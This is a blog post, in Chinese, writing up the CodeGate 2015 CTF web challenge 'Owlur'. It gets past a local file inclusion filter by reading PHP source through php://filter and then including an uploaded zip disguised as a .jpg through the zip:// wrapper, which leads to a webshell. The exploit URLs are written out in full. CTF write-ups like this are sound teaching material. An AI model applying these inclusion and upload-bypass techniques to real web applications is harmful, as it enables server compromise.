@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>CodeGate2015 CTF - WEB200 - Linux.im</title>
+    <meta name="description" content="Hacking for fun. - evi1m0"/>
+    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <style>
+      h1 {
+        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
+      }
+    </style>
+    <div class="site">
+      <div class="post-content" style="margin-top: -20px;">
+        <div id="post">
+          <h1 id="codegate2015-ctf---web200">CodeGate2015 CTF - WEB200</h1>
+<p class="date">15 Mar 2015 - evi1m0</p>
+
+<h4 id="owlur---web200">Owlur - WEB200</h4>
+
+<blockquote>
+  <p>Description</p>
+
+  <p>http://54.65.205.135/owlur/</p>
+
+  <p>if you use a web scanner, your IP will get banned, no bruteforce required, take it easy.</p>
+</blockquote>
+
+<h4 id="desc">Desc</h4>
+
+<p>File upload success (.jpg): <a href="http://54.65.205.135/owlur/index.php?page=view&amp;id=q9DLZgl">http://54.65.205.135/owlur/index.php?page=view&amp;id=q9DLZgl</a></p>
+
+<p>view-source: <a href="view-source:http://54.65.205.135/owl/duzYZc5.jpg">http://54.65.205.135/owl/duzYZc5.jpg</a></p>
+
+<h4 id="lfi">LFI</h4>
+
+<ul>
+  <li><a href="http://54.65.205.135/owlur/index.php?page=view">http://54.65.205.135/owlur/index.php?page=view</a></li>
+  <li><a href="http://54.65.205.135/owlur/index.php?page=inedx">http://54.65.205.135/owlur/index.php?page=index</a></li>
+</ul>
+
+<p>我们猜测 <code>page</code> 参数可包含文件，但当我们想要包含刚刚上传的恶意图片时，却发现 <code>page</code> 过滤了 <code>http</code>, <code>..</code>关键字，导致我们无法跳到/owl/目录下进行文件包含。比如我们这样做：</p>
+
+<ul>
+  <li><a href="http://54.65.205.135/owlur/index.php?page=/../../../../owl/duzYZc5.jpg%00">http://54.65.205.135/owlur/index.php?page=/../../../../owl/duzYZc5.jpg%00</a></li>
+</ul>
+
+<p>页面就会返回给我们：</p>
+
+<pre><code>                 / /****-- * *\
+      //(((:&lt;&lt;&lt;&lt;/:*********3\X*\((&lt;
+     /XX/CXC&amp;CGG//**/--///X*V\**..g&amp;
+(/VCC3gg0........*//X//(///V*C\*..888gg8g&amp;3C&lt;
+(3&amp;gG&amp;...........*..XXX/(((/*.\*.......G/08883X&lt;`
+/(&lt;C8 ...........*.XXXX////&lt;/..*...............3C^
+   V/&lt;^&lt;(X88&amp;V//((&lt;&lt;&lt;&lt;((&lt;^&lt;**...............X&amp;&amp;C
+          `:/CCV/(((&lt;&lt;(/VVV/*..............(/C&amp;/
+           &lt;&lt; ^^(/V33VX/VC&amp;X*VC....:&lt;&lt;~&lt;&lt;&lt;((X  `
+           V/(/&lt; ^ ^^:/X/((&lt;&lt;^^---V:~~&lt;&lt;(
+              3&amp;                  .^-/
+              C  /\       /\        |
+             /C  \/       \/       //
+ PLZ STOP     3                    |\
+   HACKING    C                   /5*
+              V     /-----\       /
+              CG  |         |  &lt;///&lt;
+              VGV |         | ^(/X&lt;^
+               &amp;&amp;&lt;  \-----/  .((&lt;(^
+                83(        .&lt;(~`&lt;&lt;
+                 8X`     .&lt;&lt;^` `((^
+                B@@C&lt;.`^^`     ^(CG&amp;C(&lt;.``
+     CG8B$@@@@@@@@@$(          ^^(0@@@@$83X&lt;`
+   B@@@@@@@@@@@@@@@@@8/       `&lt;C$@@@@@@@@@@$&amp;&lt;
+  @@@@@@@@@@@@@@@$$$@@@$$0888B@@@@@@@@@@@@@@@@@V`
+</code></pre>
+
+<p>Please stop hacking :(</p>
+
+<p>但是我们可以通过这种方式来尝试读取 <code>index.php</code>, <code>view.php</code>, <code>upload.php</code>的源代码：</p>
+
+<ul>
+  <li>http://54.65.205.135/owlur/index.php?page=php://filter/read=convert.base64-encode/resource=view</li>
+</ul>
+
+<h5 id="section">源码分析</h5>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eq6huu93caj20nn05i74h.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eq6huu93caj20nn05i74h.jpg" /></p>
+
+<pre><code>➜  /tmp  echo -n "PD9waHAKJHBpYyA9ICRfUkVRVUVTVFsnaWQnXTsKCmlmKCRwaWMgPT0gIiIgfHwgJHBpYyA9PSAicmFuZG9tIikKewokcGljbmFtZSA9ICJwcmVsb2FkZWQtb3dscy8iIC4gcmFuZCgxLDE0KSAuICIuanBnIjsKfQoKZWxzZSAkcGljbmFtZSA9ICIvb3dsLyIgLiAkcGljIC4gIi5qcGciOwoKCgplY2hvICc8aW1nIHNyYz0iJyAuICRwaWNuYW1lIC4gJyI+JzsKCj8+Cg==" | base64 -D
+&lt;?php
+$pic = $_REQUEST['id'];
+if($pic == "" || $pic == "random")
+{
+$picname = "preloaded-owls/" . rand(1,14) . ".jpg";
+}
+else $picname = "/owl/" . $pic . ".jpg";
+echo '&lt;img src="' . $picname . '"&gt;';
+?&gt;
+</code></pre>
+
+<h5 id="uploadphp-">Upload.php (部分)</h5>
+
+<p><a href="http://54.65.205.135/owlur/index.php?page=php://filter/read=convert.base64-encode/resource=upload">http://54.65.205.135/owlur/index.php?page=php://filter/read=convert.base64-encode/resource=upload</a></p>
+
+<pre><code>$target_dir = "/var/www/owlur/owlur-upload-zzzzzz/";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+$uploadOk = 0;
+$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
+$fsize = $_FILES['fileToUpload']['size'];
+$newid = RandomString();
+$newname = $newid . ".jpg";
+</code></pre>
+
+<p>这里有个有趣的变量 <code>$target_dir</code>，长时候发现图片在 /owl/ 目录及 /owlur/owlur-upload-zzzzzz/ 目录均可访问，所以我们可以不用考虑 .. 的跨路径问题了；）</p>
+
+<h5 id="indexphp-">index.php (部分)</h5>
+
+<pre><code>if(strstr($p,"..") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(stristr($p,"http") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(stristr($p,"ftp") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(strlen($p) &gt;= 60)
+die("&lt;pre&gt;string &gt; 60
+$haq&lt;/pre&gt;");
+</code></pre>
+
+<p>这里可以发现对 <code>page</code> 参数进行了三个关键字的过滤，以及长度的过滤，通过上面发现的 /owlur-upload-zzzzzz/ 路径我们可直接绕过长度的限制，但是现在又面临另外一个问题，截断。</p>
+
+<p>使用 <code>%00</code>, <code>////////////////////////////////</code>, <code>.......................</code> 等截断方法均失败，最后试了下 zip 协议截断终于成功：</p>
+
+<ol>
+  <li>新建 test.php 里面编写 php 代码；</li>
+  <li>将 test.php 压缩为 test.zip 后把 zip 的名字改成 test.jpg；</li>
+  <li>上传 .jpg 上传，然后包含；</li>
+</ol>
+
+<p><img src="http://ww1.sinaimg.cn/large/c334041bgw1eq6im8fhpkj20kt06y0u4.jpg" alt="http://ww1.sinaimg.cn/large/c334041bgw1eq6im8fhpkj20kt06y0u4.jpg" /></p>
+
+<p>phpinfo: <a href="http://54.65.205.135/owlur/index.php?page=zip://owlur-upload-zzzzzz/ITbmhwn.jpg%23test">http://54.65.205.135/owlur/index.php?page=zip://owlur-upload-zzzzzz/ITbmhwn.jpg%23test</a></p>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eq6iqq1zgaj20kw08mmy6.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eq6iqq1zgaj20kw08mmy6.jpg" /></p>
+
+<p>最后我们连接 <code>webshell</code> 后，发现 flag 静静的躺在根目录下：</p>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eq6irjcxrwj20m2056t95.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eq6irjcxrwj20m2056t95.jpg" /></p>
+
+        </div>
+      </div>
+
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_shortname = 'evi1m0';
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
